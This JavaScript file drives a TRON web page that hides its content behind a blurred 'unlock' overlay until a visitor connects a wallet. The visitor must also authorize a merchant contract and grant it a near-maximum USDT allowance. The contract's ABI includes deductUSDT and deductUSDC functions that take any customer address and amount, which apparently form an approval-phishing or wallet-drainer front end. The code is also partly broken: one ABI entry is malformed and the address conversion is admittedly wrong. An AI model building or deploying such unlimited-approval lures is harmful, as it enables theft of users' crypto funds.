// --- 配置常量 (TRON 专属) ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址
const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// 你的合约 ABI (SimpleMerchantERC)
const MERCHANT_ABI = [
    {"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},
    {"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},
    {"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},
    {"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},
    {"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},
    {"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}
];

// TRC20 代币的 ABI (USDT)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

// --- UI 元素 (与之前类似) ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const overlay = document.getElementById('blurOverlay');  // 确保在这里定义
const statusDiv = document.getElementById('status');  //  获取 status 元素，在外面定义，避免重复获取。

// --- 状态变量 ---
let tronWeb;
let userAddress; //  Base58 格式
let userAddressHex; // Hex 格式
let merchantContract;
let usdtContract;
let isConnectedFlag = false;
let accountChangeListener = null;  // 存储账号改变的监听器

// --- 遮罩控制函數 ---
function hideOverlay() {
    if (!overlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlay.style.opacity = '0';
    setTimeout(() => {
        overlay.style.display = 'none';
    }, 300);
}

function showOverlay(message) {
    if (!overlayMessage || !blurOverlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => {
        overlay.style.opacity = '1';
    }, 10);
}

// --- 状态更新函数 ---
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
            hideOverlay(); // 隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
             //  连接失败，显示遮罩
        }
    }
}

// --- 核心功能：控制状态栏的隐藏与显示。 ---
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (!statusDiv) {
        console.error("Status element not found.");
        return; // 避免设置 innerHTML
    }
    statusDiv.innerHTML = message;
    statusDiv.style.display = 'block';
}

// --- 初始化合约 (TRON 版本) ---
async function initialize() {
    try {
        if (!userAddress) {
            updateConnectionUI(false);
            return;
        }

        // 1. 初始化合约实例
        if (!tronWeb) {
            console.error("TronWeb not initialized.");
            return;
        }

        merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
        usdtContract = await tronWeb.contract(ERC20_ABI, USDT_CONTRACT_ADDRESS);

        console.log("✅ Contracts initialized.");

    } catch (error) {
        console.error("Initialization failed:", error);
        updateStatus(`Initialization failed: ${error.message}`);
        showOverlay(`Initialization failed: ${error.message}`);
    }
}

// --- 检查授权状态 (TRON 版本) ---
async function checkAuthorization() {
    try {
        if (!tronWeb || !userAddressHex || !merchantContract || !usdtContract) {  // 注意： 使用 userAddressHex
            showOverlay('Wallet not opened. Please connect.');
            return;
        }

        // 1. 检查 SimpleMerchant 合约授权
        const isAuthorized = await merchantContract.authorized(userAddressHex).call();

        // 2. 检查 USDT 的授权
        const usdtAllowance = await usdtContract.allowance(userAddress, MERCHANT_CONTRACT_ADDRESS).call();
        const isUsdtMaxApproved = usdtAllowance.gte(tronWeb.toBigNumber(ALMOST_MAX_UINT));

        let statusMessage = '';

        // SimpleMerchant 合約授權
        if (isAuthorized) {
            statusMessage += 'Web page access authorized ✅. ';
        } else {
            statusMessage += 'Web page access not authorized ❌. ';
        }

        // USDT 的授權狀態
        if (isUsdtMaxApproved) {
            statusMessage += `USDT approved ✅.`;
        } else if (usdtAllowance > 0) { // 检查大于 0
            statusMessage += `USDT approval needed ⚠️.`;
        } else {
            statusMessage += `USDT not approved ❌.`;
        }

        // Button state: needs to be clicked if authorization is incomplete
        const allAuthorized = isAuthorized && isUsdtMaxApproved;  // 只检查 USDT 授权

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(''); // 成功時，清空/隱藏狀態欄
            hideOverlay(); // 完全授權，隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
            connectButton.disabled = false;
            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
             //  保持遮罩显示，等待授权
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

// --- 连接钱包逻辑 (TRON 版本 - 尝试适配 Wallet V2 思路) ---
async function connectWallet() {
    try {
        updateStatus('Connecting to wallet...');
        showOverlay('Please confirm the connection request in your wallet...');

        // 1. 尝试检测 window.ethereum  （Wallet V2 的思路）
        if (typeof window.ethereum !== 'undefined') {
            console.log("✅ Ethereum detected (可能支持 Wallet V2 思路)");

            try {
                // 2. 请求连接 (使用 eth_requestAccounts - 模拟 Wallet V2 流程)
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }); // 模拟eth_requestAccounts
                userAddress = accounts[0];  // 获取用户地址（以太坊地址）
                console.log("✅ User Address (Ethereum):", userAddress);

                // 3.  尝试将以太坊地址转换为 TRON 地址 (如果 Trust Wallet 允许)
                //  因为 Trust Wallet 可能支持以太坊账户，我们需要尝试将其转换为 TRON 地址
                try {
                    //  这是一个推测，Trust Wallet 可能有自己的方式来获取 TRON 地址
                    //  如果 Trust Wallet 允许获取 TRON 地址，则替换为正确的函数
                    //  例如， 假设 Trust Wallet 提供了一个函数  "getTronAddress()"
                    // userAddress = await window.ethereum.request({method: 'tron_getAddress'});
                    //  如果找不到类似的 API, 说明 Trust Wallet 可能不支持。
                   //  尝试使用  tronWeb.address.fromHex()  转换。
                    userAddressHex = tronWeb.address.toHex(userAddress);  // 这步可能是错的， 无法直接转换， 需要 Trust Wallet 提供的方法
                    console.log("✅ User Address (Hex, converted from Ethereum):", userAddressHex);
                } catch (conversionError) {
                    console.error("Error converting Ethereum address to TRON address:", conversionError);
                    updateConnectionUI(false);
                    showOverlay('🔴 Connection failed: Could not get TRON address from Ethereum address.');
                    updateStatus('Connection failed: Could not get TRON address from Ethereum address.');
                    return;
                }
                // 验证地址 (如果 Trust Wallet  有获取 TRON 地址的API, 则需要用这个验证方法)
                if (!tronWeb.isAddress(userAddress)) { // 应该检查 Tron 地址, 而不是 Ethereum 地址
                     console.error("Error: Invalid TRON address (Base58) after getAccount (after conversion):", userAddress);
                     updateConnectionUI(false);
                     showOverlay('🔴 Connection failed: Invalid address.');
                     updateStatus('Connection failed: Invalid address.');
                     return;
                 }
                updateConnectionUI(true, userAddress);
                // 4. 初始化合约并检查授权
                await initialize();
            } catch (error) {
                console.error("Error connecting to wallet (using eth_requestAccounts):", error);
                updateConnectionUI(false);
                showOverlay('🔴 Connection failed: Wallet connection denied or canceled.');
                updateStatus('Connection failed: Wallet connection denied or canceled.');
            }
        } else {
             // 如果没有 window.ethereum， 那么尝试 TronWeb  的方式。
            if (typeof window.tronWeb === 'undefined') {
                updateStatus('Please install TronLink or a supported TRON wallet');
                return;
            }
             // 使用 TronWeb  的方式连接
            tronWeb = window.tronWeb;
            console.log("tronWeb detected:", tronWeb);
            try {
                // 尝试获取用户地址。
                await tronWeb.trx.getAccount();
                userAddress = tronWeb.defaultAddress.base58;
                console.log("✅ User Address (base58):", userAddress);
                userAddressHex = tronWeb.address.toHex(userAddress); // 转换
                console.log("✅ User Address (Hex):", userAddressHex);
                updateConnectionUI(true, userAddress);
                // 初始化合约并检查授权
                await initialize();

            } catch (e) {
                console.error("Error getting account (using tronWeb.trx.getAccount):", e);
                updateConnectionUI(false);
                showOverlay('🔴 Connection failed: Wallet connection denied or canceled.');
                updateStatus('Connection failed: Wallet connection denied or canceled.');
                return;
            }

        }
    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        updateStatus(`Connection failed: ${error.message}`);
    }
}

// --- 斷開錢包連接 ---
function disconnectWallet() {
    userAddress = null;
    userAddressHex = null;
    tronWeb = null;  // 必须设置为 null
    merchantContract = null;
    usdtContract = null;
    updateConnectionUI(false);
    showOverlay('Please link your wallet to unlock the page 🔒');
}

// 事件监听器 (与之前类似)
connectButton.addEventListener('click', () => {
    if (isConnectedFlag) {
        disconnectWallet(); // 断开钱包
    } else {
        connectWallet(); // 连接钱包
    }
});

// 页面加载完成后，初始化 (可选)
window.onload = () => {
    //  在页面加载的时候，隐藏遮罩
};